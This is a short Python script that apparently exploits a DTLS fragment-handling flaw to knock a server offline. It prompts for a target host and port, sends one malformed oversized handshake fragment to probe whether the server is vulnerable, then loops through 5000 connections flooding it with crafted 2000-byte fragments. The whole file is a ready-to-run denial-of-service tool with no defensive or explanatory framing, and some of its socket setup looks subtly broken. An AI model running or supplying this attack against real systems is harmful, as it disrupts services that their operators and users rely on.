import struct
import ssl
import sys
import signal
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection

target = input("=> Target website/IP address : ")
port = int(input("=> Port number : "))

#Creating and wrapping SSL socket and establishing connection with target
def open_socket(target1, port1):
    socket1 = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(socket1, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    socket1.connect((target1, port1))
    return socket1

#Creating packets for checking presence of vulnerability and also for DoS attack
def dos_packet(frag_no, frag_id):
    frag = "A" * 2000
    buffer1 = struct.pack("<HHHHH", 5, 2006, frag_id, frag_no, 2000)
    buffer1 += frag.encode()
    return buffer1

#Check if the server is vulnerable
do_patch()
socketA = open_socket(target, port)
packetA = dos_packet(100, 0)
socketA.write(packetA)
signal.signal(signal.SIGALRM, lambda signum, frame: None)
signal.alarm(5)
vuln = False

try:
    response = socketA.recv(16)[-4:]
    value = struct.unpack("<L", response)[0]
    vuln = value != 0x8000ffff
except:
    vuln = True
signal.alarm(0)
socketA.close()

#If vulnerable, Initiating DoS attack
if vuln:
    print("Target is vulnerable.\nInitiating DoS attack.")
    do_patch()
    for i in range(5000):
        socket1 = open_socket(target, port)
        for j in range(10):
            packet = dos_packet(i, i)
            socket1.write(packet)
        socket1.close()

else:
    print("Target not vulnerable.")
